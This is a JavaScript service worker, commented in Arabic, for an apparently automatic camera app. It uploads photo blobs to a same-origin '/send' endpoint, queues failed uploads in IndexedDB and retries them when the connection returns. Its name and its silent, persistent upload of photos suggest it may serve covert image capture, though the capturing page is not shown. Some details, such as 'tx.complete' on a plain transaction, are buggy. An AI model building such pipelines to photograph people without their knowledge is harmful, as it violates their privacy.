const CACHE_NAME = "auto-camera-cache-v1";

// تثبيت الـ SW وتخزين ملفات مهمة (إذا أردت)
self.addEventListener("install", event => {
  console.log("Service Worker installed ✅");
  self.skipWaiting();
});

self.addEventListener("activate", event => {
  console.log("Service Worker activated ✅");
  self.clients.claim();
});

// IndexedDB لتخزين الصور مؤقتًا
let dbPromise = null;
function getDB() {
  if (!dbPromise) {
    dbPromise = new Promise((resolve, reject) => {
      const request = indexedDB.open("AutoCameraDB", 1);
      request.onupgradeneeded = e => {
        const db = e.target.result;
        if (!db.objectStoreNames.contains("photos")) {
          db.createObjectStore("photos", { autoIncrement: true });
        }
      };
      request.onsuccess = e => resolve(e.target.result);
      request.onerror = e => reject(e.target.error);
    });
  }
  return dbPromise;
}

// حفظ صورة في IndexedDB
async function savePhoto(blob) {
  const db = await getDB();
  const tx = db.transaction("photos", "readwrite");
  tx.objectStore("photos").add(blob);
  return tx.complete;
}

// استرجاع كل الصور المخزنة
async function getAllPhotos() {
  const db = await getDB();
  return new Promise(resolve => {
    const tx = db.transaction("photos", "readonly");
    const store = tx.objectStore("photos");
    const request = store.getAll();
    request.onsuccess = e => resolve(e.target.result);
  });
}

// حذف الصور بعد الإرسال
async function clearPhotos() {
  const db = await getDB();
  const tx = db.transaction("photos", "readwrite");
  tx.objectStore("photos").clear();
  return tx.complete;
}

// محاولة إرسال صورة للسيرفر
async function sendPhotoToServer(blob) {
  try {
    const formData = new FormData();
    formData.append("photo", blob, "photo.jpg");
    await fetch("/send", { method: "POST", body: formData });
    console.log("Photo sent successfully ✅");
    return true;
  } catch (err) {
    console.log("Failed to send photo, saved for later ❌");
    return false;
  }
}

// إرسال كل الصور المخزنة
async function flushPhotos() {
  const photos = await getAllPhotos();
  for (const blob of photos) {
    const success = await sendPhotoToServer(blob);
    if (!success) return; // توقف إذا فشل الاتصال
  }
  await clearPhotos();
}

// استماع للرسائل من الصفحة
self.addEventListener("message", event => {
  if (event.data && event.data.type === "STORE_PHOTO") {
    const blob = event.data.blob;
    sendPhotoToServer(blob).then(success => {
      if (!success) savePhoto(blob); // تخزين عند فشل الإرسال
    });
  }
});

// إعادة محاولة إرسال الصور عند اتصال الإنترنت
self.addEventListener("sync", event => {
  if (event.tag === "flush-photos") {
    event.waitUntil(flushPhotos());
  }
});

// مراقبة إعادة الاتصال
self.addEventListener("online", () => flushPhotos());
